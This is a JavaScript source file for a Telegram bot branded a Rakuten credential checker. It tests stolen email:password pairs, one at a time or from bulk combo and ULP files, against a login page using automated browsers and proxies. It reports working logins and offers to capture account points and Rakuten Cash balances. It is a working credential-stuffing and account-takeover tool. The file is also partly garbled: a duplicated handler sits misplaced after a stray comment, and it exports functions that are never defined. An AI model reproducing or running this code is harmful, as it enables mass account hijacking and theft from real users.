const { Telegraf, Markup } = require('telegraf');
const { checkCredentials } = require('./puppeteerChecker');
const { closeBrowserSession } = require('./automation/browserManager');
const { captureAccountData } = require('./automation/dataCapture');
const {
  prepareBatchFromFile,
  prepareUlpBatch,
  ALLOWED_DOMAINS,
  MAX_BYTES_HOTMAIL,
  MAX_BYTES_ULP,
} = require('./automation/batchProcessor');
const fs = require('fs').promises;

// Track sessions kept alive after VALID outcomes for optional data capture.
const pendingSessions = new Map();
const pendingTimeouts = new Map();
const pendingMeta = new Map();
const pendingBatches = new Map();
const pendingFiles = new Map();
const BATCH_CONCURRENCY = 3; // number of parallel workers per batch

/**
 * Validates and parses the credential string format "user:pass".
 * @param {string} credentialString - Raw credential string
 * @returns {Object|null} { username, password } or null if invalid
 */
function parseCredentials(credentialString) {
  if (!credentialString || typeof credentialString !== 'string') {
    return null;
  }

  const parts = credentialString.split(':');
  if (parts.length !== 2 || !parts[0].trim() || !parts[1].trim()) {
    return null;
  }

  return {
    username: parts[0].trim(),
    password: parts[1].trim(),
  };
}

/**
 * Validates email format.
 * @param {string} email - Email to validate
 * @returns {boolean} True if valid email format
 */
  // Handle batch file uploads: first ask type (HOTMAIL or ULP)
  bot.on('document', async (ctx) => {
    const doc = ctx.message && ctx.message.document;
    if (!doc) return;

    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;

    let fileUrl;
    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      fileUrl = link.href || link.toString();
    } catch (err) {
      await ctx.replyWithMarkdown(
        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingFiles.set(key, {
      fileUrl,
      filename: doc.file_name || 'file.txt',
      size: doc.file_size,
      sourceMessageId,
    });

    await ctx.replyWithMarkdown(
      '📂 *File received*' +
      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
      `\n• Size: ${formatBytes(doc.file_size)}` +
      '\n\nSelect file type:',
      {
        reply_to_message_id: sourceMessageId,
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('📧 HOTMAIL', `batch_type_hotmail_${sourceMessageId}`),
            Markup.button.callback('🗂 ULP', `batch_type_ulp_${sourceMessageId}`),
          ],
          [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
        ]),
      }
    );
  });
 
/**
 * Formats a result object into a user-friendly Telegram message with markdown.
 * @param {Object} result - Result from checkCredentials
 * @param {string} result.status - Status code
 * @param {string} result.message - Status message
 * @param {string} [result.screenshot] - Optional screenshot path
 * @param {string} [username] - Username being checked (masked)
 * @param {number} [durationMs] - Duration in milliseconds
 * @returns {string} Formatted message for Telegram
 */
function escapeV2(text) {
  if (!text) return '';
  return text.replace(/([_\*\[\]\(\)~`>#+\-=|{}.!])/g, '\\$1');
}

function codeV2(text) {
  return '`' + escapeV2(text) + '`';
}

function formatBytes(bytes) {
  if (!bytes || Number.isNaN(bytes)) return 'unknown';
  const mb = bytes / (1024 * 1024);
  return `${mb.toFixed(2)} MB`;
}

function formatDurationMs(ms) {
  const seconds = ms / 1000;
  if (seconds < 60) return `${seconds.toFixed(1)}s`;
  const minutes = Math.floor(seconds / 60);
  const rem = (seconds % 60).toFixed(1);
  return `${minutes}m ${rem}s`;
}

function boldV2(text) {
  return '*' + escapeV2(text) + '*';
}

function formatResultMessage(result, username = null, durationMs = null) {
  const statusEmoji = { VALID: '✅', INVALID: '❌', BLOCKED: '🔒', ERROR: '⚠️' };
  const statusLabel = {
    VALID: 'VALID CREDENTIALS',
    INVALID: 'INVALID CREDENTIALS',
    BLOCKED: 'ACCOUNT BLOCKED',
    ERROR: 'ERROR OCCURRED',
  };

  const emoji = statusEmoji[result.status] || '❓';
  const status = boldV2(statusLabel[result.status] || result.status || 'STATUS');

  const parts = [];
  parts.push(`${emoji} ${status}`);

  if (username) {
    const maskedUser = username.length > 3
      ? `${username.substring(0, 3)}***${username.substring(username.length - 2)}`
      : '***';
    parts.push(`${boldV2('👤 Account')}: ${codeV2(maskedUser)}`);
  }

  if (durationMs != null) {
    const seconds = durationMs / 1000;
    const pretty = seconds >= 10 ? seconds.toFixed(1) : seconds.toFixed(2);
    parts.push(`${boldV2('🕒 Time')}: ${codeV2(`${pretty}s`)}`);
  }

  parts.push(`${boldV2('📝 Result')}: ${escapeV2(result.message || '')}`);

  if (result.url) {
    const shortUrl = result.url.length > 60 ? `${result.url.substring(0, 60)}...` : result.url;
    parts.push(`${boldV2('🔗 Final URL')}: ${codeV2(shortUrl)}`);
  }

  if (result.screenshot) {
    parts.push(boldV2('📸 Screenshot attached'));
  }

  return parts.join('\n');
}

// Async batch executor scheduled off the callback to avoid Telegraf 90s timeout.
async function runBatchExecution(ctx, batch, msgId, statusMsg, options, key) {
  const chatId = ctx.chat.id;
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();

  const iterator = batch.creds[Symbol.iterator]();

  const processCredential = async (cred) => {
    if (batch.aborted) return;
    let result;
    try {
      result = await checkCredentials(cred.username, cred.password, {
        timeoutMs: options.timeoutMs || 60000,
        proxy: options.proxy,
        screenshotOn: false,
        targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        headless: options.headless,
      });
    } catch (err) {
      result = { status: 'ERROR', message: err.message };
    }

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;

    if (result.status === 'VALID') {
      validCreds.push(`• ||\`${escapeV2(cred.username)}:${escapeV2(cred.password)}\`||`);
    }

    if (batch.aborted) {
      return;
    }

    if (processed === 1 || processed === batch.count || processed % 5 === 0) {
      const text =
        `${escapeV2('⏳ Batch progress')}` +
        `\nFile: ${escapeV2(batch.filename)}` +
        `\nProcessed: *${processed}/${batch.count}*` +
        `\n✅ VALID: *${counts.VALID || 0}*` +
        `\n❌ INVALID: *${counts.INVALID || 0}*` +
        `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
        `\n⚠️ ERROR: *${counts.ERROR || 0}*`;

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        // ignore edit failures
      }
    }
  };

  const worker = async () => {
    for (;;) {
      if (batch.aborted) return;
      const next = iterator.next();
      if (next.done) return;
      await processCredential(next.value);
    }
  };

  try {
    const poolSize = Math.min(BATCH_CONCURRENCY, batch.creds.length);
    await Promise.all(Array.from({ length: poolSize }, () => worker()));

    const elapsed = Date.now() - startedAt;
    const summaryTitle = batch.aborted ? '⏹️ Batch aborted' : '📊 Batch complete';
    const summary =
      `${escapeV2(summaryTitle)}` +
      `\nFile: ${escapeV2(batch.filename)}` +
      `\nTotal: *${batch.count}*` +
      `\n✅ VALID: *${counts.VALID || 0}*` +
      `\n❌ INVALID: *${counts.INVALID || 0}*` +
      `\n🔒 BLOCKED: *${counts.BLOCKED || 0}*` +
      `\n⚠️ ERROR: *${counts.ERROR || 0}*` +
      `\n🕒 Time: *${escapeV2(formatDurationMs(elapsed))}*` +
      `\n\n${escapeV2('VALID accounts:')}` +
      `\n${validCreds.length ? validCreds.join('\n') : escapeV2('• None')}`;

    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
        parse_mode: 'MarkdownV2',
      });
    } catch (err) {
      await ctx.reply(summary, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
    }
  } catch (err) {
    console.error('Batch execution error:', err.message);
    try {
      await ctx.replyWithMarkdown(
        `⚠️ Batch failed: ${escapeV2(err.message)}`,
        { reply_to_message_id: Number(msgId) }
      );
    } catch (_) {
      // swallow
    }
  } finally {
    pendingBatches.delete(key);
  }
}

/**
 * Initializes and sets up the Telegram handler.
 * @param {string} botToken - Telegram bot token
 * @param {Object} [options] - Optional configuration
 * @returns {Telegraf} Configured bot instance
 */
function initializeTelegramHandler(botToken, options = {}) {
  const bot = new Telegraf(botToken);

  // Handle /start command
  bot.start(async (ctx) => {
    await ctx.replyWithMarkdown(
      '🎌 *RAKUTEN CREDENTIAL CHECKER*\n\n' +
      '✨ Fast, secure, and automated validation\n\n' +
      '📖 *HOW TO USE:*\n' +
      '`.chk email:password`\n\n' +
      '💡 *EXAMPLE:*\n' +
      '`.chk user@example.com:mypass123`\n\n' +
      '🔒 *FEATURES:*\n' +
      '• Live status updates\n' +
      '• Screenshot evidence\n' +
      '• Masked credentials\n' +
      '• Inline action buttons\n\n' +
      '⚡ Ready to start!',
      Markup.inlineKeyboard([
        [Markup.button.callback('📚 Guide', 'guide'), Markup.button.callback('❓ Help', 'help')],
      ])
    );
  });

  // Handle /help command
  bot.command('help', async (ctx) => {
    await ctx.replyWithMarkdown(
      '❓ *HELP & SUPPORT*\n\n' +
      '*Format:* `.chk email:password`\n\n' +
      '*Status Indicators:*\n' +
      '✅ VALID - Credentials work\n' +
      '❌ INVALID - Wrong credentials\n' +
      '🔒 BLOCKED - Account locked\n' +
      '⚠️ ERROR - Technical issue\n\n' +
      '*Notes:*\n' +
      '• Max 200 characters\n' +
      '• Use colon to separate email:password\n' +
      '• Results are private to your chat'
    );
  });

  // Handle batch file uploads (<=50MB, Microsoft .jp domains only)
  bot.on('document', async (ctx) => {
    const doc = ctx.message && ctx.message.document;
    if (!doc) return;

    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;
    const sizeLimit = 50 * 1024 * 1024;
    if (doc.file_size && doc.file_size > sizeLimit) {
      await ctx.replyWithMarkdown(
        '⚠️ File too large. Max allowed size is 50MB.',
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    let fileUrl;
    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      fileUrl = link.href || link.toString();
    } catch (err) {
      await ctx.replyWithMarkdown(
        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    let batch;
    try {
      batch = await prepareBatchFromFile(fileUrl, sizeLimit);
    } catch (err) {
      await ctx.replyWithMarkdown(
        `⚠️ Failed to read file: ${escapeV2(err.message)}`,
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    if (!batch.count) {
      await ctx.replyWithMarkdown(
        'ℹ️ No eligible Microsoft .jp credentials found in this file.',
        { reply_to_message_id: doc.message_id }
      );
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: doc.file_name || 'file.txt',
      count: batch.count,
      sourceMessageId,
    });

    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
    await ctx.replyWithMarkdown(
      '📂 *File received*' +
      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
      `\n• Size: ${formatBytes(doc.file_size)}` +
      `\n• Eligible credentials: *${batch.count}*` +
      '\n• Allowed domains: ' + allowedDomainsText +
      '\n\nProceed to check them?',
      {
        reply_to_message_id: sourceMessageId,
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${sourceMessageId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`),
          ],
        ]),
      }
    );
  });

  // Handle .chk command
  bot.hears(/^\.chk\s+(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const credentialString = ctx.match[1].trim();
    const startedAt = Date.now();

    // Guard input
    const guard = guardInput(credentialString);
    if (!guard.valid) {
      await ctx.replyWithMarkdown(`❌ ${guard.error}`);
      return;
    }

    // Parse credentials
    const creds = parseCredentials(credentialString);
    if (!creds) {
      await ctx.replyWithMarkdown(
        '❌ Failed to parse credentials.\n\nFormat: `.chk username:password`'
      );
      return;
    }

    // Send processing message (will be edited later)
    const statusMsg = await ctx.replyWithMarkdown('⏳ Checking credentials...');

    const updateStatus = async (text) => {
      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, null, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        console.warn('Status edit failed:', err.message);
      }
    };

    try {
      // Keep creds in state for follow-up capture summary (masked via spoiler later).
      ctx.state.lastUsername = creds.username;
      ctx.state.lastPassword = creds.password;

      // Check credentials
      const result = await checkCredentials(
        creds.username,
        creds.password,
        {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          screenshotOn: options.screenshotOn || false,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
          headless: options.headless,
          deferCloseOnValid: true, // keep session open for optional capture flow
          onProgress: async (phase) => {
            const phaseText = {
              launch: '⏳ Launching browser...',
              navigate: '🌐 Navigating to login page...',
              email: '✉️ Submitting email...',
              password: '🔑 Submitting password...',
              analyze: '🔍 Analyzing result...',
            };
            const text = phaseText[phase] || '⏳ Working...';
            await updateStatus(escapeV2(text));
          },
        }
      );

      // Format result message with masked username
      const durationMs = Date.now() - startedAt;
      const resultMessage = formatResultMessage(result, creds.username, durationMs);
      
      // Edit message with final result
      await updateStatus(resultMessage);

      // Always remove any screenshot file quietly
      if (result.screenshot) {
        await fs.unlink(result.screenshot).catch(() => {});
      }

      // Offer follow-up data capture only for valid credentials
      if (result.status === 'VALID') {
        const capturePrompt = await ctx.reply(
          '🔍 Proceed to capture data?',
          {
            parse_mode: 'Markdown',
            reply_to_message_id: statusMsg.message_id,
            ...Markup.inlineKeyboard([
              [
                Markup.button.callback('▶️ Yes, capture data', 'capture_data'),
                Markup.button.callback('⛔ No, skip', 'capture_decline'),
              ],
            ]),
          }
        );

        const sessionKey = `${chatId}:${capturePrompt.message_id}`;
        if (result.session) {
          pendingSessions.set(sessionKey, result.session);
          pendingMeta.set(sessionKey, {
            username: creds.username,
            password: creds.password,
          });
        }

        const captureExpiryMs = 60000; // expire prompt after 60s to avoid stale actions
        const timerId = setTimeout(async () => {
          try {
            await ctx.telegram.editMessageText(
              chatId,
              capturePrompt.message_id,
              undefined,
              '⌛ Capture session expired. Send `.chk email:password` again to restart.',
              { parse_mode: 'Markdown' }
            );
            const session = pendingSessions.get(sessionKey);
            if (session) {
              await closeBrowserSession(session).catch(() => {});
              pendingSessions.delete(sessionKey);
            }
            pendingMeta.delete(sessionKey);
            pendingTimeouts.delete(sessionKey);
          } catch (err) {
            // Ignore if already handled or edited
          }
        }, captureExpiryMs);
        pendingTimeouts.set(sessionKey, timerId);
      }
    } catch (err) {
      console.error('Credential check error:', err.message);
      
      // Edit status message to show error
      try {
        await ctx.telegram.editMessageText(
          chatId,
          statusMsg.message_id,
          null,
          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
          { parse_mode: 'MarkdownV2' }
        );
      } catch (editErr) {
        await ctx.reply(
          `⚠️ *ERROR OCCURRED*\n\n❌ ${escapeV2(err.message)}\n\n_Try again or contact support_`,
          { parse_mode: 'MarkdownV2' }
        );
      }
    }
  });

  // Handle inline button callbacks
  bot.action('capture_data', async (ctx) => {
    await ctx.answerCbQuery('⏳ Data capture flow will start soon.');
    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
    const timerId = pendingTimeouts.get(key);
    if (timerId) {
      clearTimeout(timerId);
      pendingTimeouts.delete(key);
    }
    const session = pendingSessions.get(key);
    if (!session) {
      await ctx.replyWithMarkdown(
        '⚠️ Session expired. Send `.chk email:password` to start again.',
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
      return;
    }
    const meta = pendingMeta.get(key) || {};

    try {
      const capture = await captureAccountData(session, { timeoutMs: options.timeoutMs || 60000 });
      const username = meta.username || 'unknown';
      const password = meta.password || 'hidden';
      const message =
        `${escapeV2('🗂️ Capture Summary')}` +
        `\n• *Points:* ${escapeV2(capture.points || 'n/a')}` +
        `\n• *Rakuten Cash:* ${escapeV2(capture.cash || 'n/a')}` +
        `\n• Username: ||\`${escapeV2(username)}\`||` +
        `\n• Password: ||\`${escapeV2(password)}\`||`;

      await ctx.reply(message, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update.callback_query.message.message_id,
      });
    } catch (err) {
      console.error('Capture failed:', err.message);
      await ctx.replyWithMarkdown(
        `⚠️ Capture failed: ${escapeV2(err.message)}`,
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
    } finally {
      await closeBrowserSession(session).catch(() => {});
      pendingSessions.delete(key);
      pendingMeta.delete(key);
    }
  });

  bot.action('capture_decline', async (ctx) => {
    await ctx.answerCbQuery('✅ Capture skipped.');
    const key = `${ctx.chat.id}:${ctx.update.callback_query.message.message_id}`;
    const timerId = pendingTimeouts.get(key);
    if (timerId) {
      clearTimeout(timerId);
      pendingTimeouts.delete(key);
    }
    const session = pendingSessions.get(key);
    if (session) {
      await closeBrowserSession(session).catch(() => {});
      pendingSessions.delete(key);
    }
    pendingMeta.delete(key);
    try {
      await ctx.editMessageText('❎ Data capture skipped. Send `.chk` again if you want to restart.', {
        parse_mode: 'Markdown',
      });
    } catch (err) {
      await ctx.replyWithMarkdown(
        '❎ Data capture skipped.',
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
    }
  });

  // Batch confirmation handlers
  bot.action(/batch_confirm_(.+)/, async (ctx) => {
    try {
      await ctx.answerCbQuery();
      const msgId = ctx.match[1];
      const key = `${ctx.chat.id}:${msgId}`;
      const batch = pendingBatches.get(key);
      if (!batch) {
        await ctx.replyWithMarkdown(
          '⚠️ Batch expired. Send the file again to restart.',
          { reply_to_message_id: Number(msgId) }
        );
        return;
      }

      const statusMsg = await ctx.replyWithMarkdown(
        `⏳ Starting batch check for *${escapeV2(batch.filename)}*\nEntries: *${batch.count}*`,
        {
          reply_to_message_id: Number(msgId),
          ...Markup.inlineKeyboard([
            [Markup.button.callback('⏹ Abort', `batch_abort_${msgId}`)],
          ]),
        }
      );

      // Run batch asynchronously to avoid Telegraf 90s per-update timeout.
      setTimeout(() => {
        runBatchExecution(ctx, batch, msgId, statusMsg, options, key);
      }, 0);
    } catch (err) {
      console.error('Batch handler error:', err.message);
      await ctx.replyWithMarkdown(
        `⚠️ Batch failed: ${escapeV2(err.message)}`,
        { reply_to_message_id: ctx.update?.callback_query?.message?.message_id }
      );
    }
  });

  bot.action(/batch_cancel_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Batch cancelled');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    pendingBatches.delete(key);
    pendingFiles.delete(key);
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        '❎ Batch cancelled. Send a new file to try again.',
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      await ctx.replyWithMarkdown(
        '❎ Batch cancelled. Send a new file to try again.',
        { reply_to_message_id: Number(msgId) }
      );
    }
  });

  bot.action(/batch_type_hotmail_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        '⏳ Processing HOTMAIL file...',
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      // ignore
    }

    let batch;
    try {
      batch = await prepareBatchFromFile(file.fileUrl, MAX_BYTES_HOTMAIL);
    } catch (err) {
      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    if (!batch.count) {
      await ctx.replyWithMarkdown('ℹ️ No eligible Microsoft .jp credentials found.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      sourceMessageId: Number(msgId),
    });

    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
    await ctx.replyWithMarkdown(
      '📂 *HOTMAIL list parsed*' +
      `\n• Name: ${escapeV2(file.filename)}` +
      `\n• Size: ${formatBytes(file.size)}` +
      `\n• Eligible credentials: *${batch.count}*` +
      '\n• Allowed domains: ' + allowedDomainsText +
      '\n\nProceed to check them?',
      {
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_type_ulp_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        '⏳ Processing ULP file (this may take a while)...',
        { parse_mode: 'Markdown' }
      );
    } catch (err) {
      // ignore
    }

    let batch;
    try {
      batch = await prepareUlpBatch(file.fileUrl, MAX_BYTES_ULP);
    } catch (err) {
      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    if (!batch.count) {
      await ctx.replyWithMarkdown('ℹ️ No eligible Rakuten credentials found in this file.', {
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      sourceMessageId: Number(msgId),
    });

    await ctx.replyWithMarkdown(
      '🗂 *ULP list parsed*' +
      `\n• Name: ${escapeV2(file.filename)}` +
      `\n• Size: ${formatBytes(file.size)}` +
      `\n• Eligible credentials: *${batch.count}*` +
      '\n• Filter: lines containing `rakuten.co.jp` (deduped)' +
      '\n\nProceed to check them?',
      {
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_abort_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Aborting...');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const batch = pendingBatches.get(key);
    if (batch) {
      batch.aborted = true;
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          ctx.update.callback_query.message.message_id,
          undefined,
          '⏹ Aborting batch, please wait...',
          {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([]),
          }
        );
      } catch (err) {
        // ignore
      }
    } else {
      await ctx.replyWithMarkdown(
        '⚠️ No active batch to abort.',
        { reply_to_message_id: ctx.update.callback_query.message.message_id }
      );
    }
  });

  bot.action('guide', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '📚 *QUICK GUIDE*\n\n' +
      '*1.* Type `.chk` followed by your credentials\n' +
      '*2.* Format: `email:password` (no spaces)\n' +
      '*3.* Wait for the check to complete\n' +
      '*4.* Review the result with evidence\n\n' +
      '✨ Bot edits the message in real-time!'
    );
  });

  bot.action('help', async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.replyWithMarkdown(
      '❓ *NEED HELP?*\n\n' +
      'Send: `/help` for detailed instructions\n\n' +
      'Or just try:\n' +
      '`.chk test@example.com:password123`'
    );
  });

  // Launch bot
  bot.launch();
  
  console.log('✓ Bot launched successfully!');

  return bot;
}

module.exports = {
  initializeTelegramHandler,
  parseCredentials,
  guardInput,
  formatResultMessage,
  isValidEmail,
};
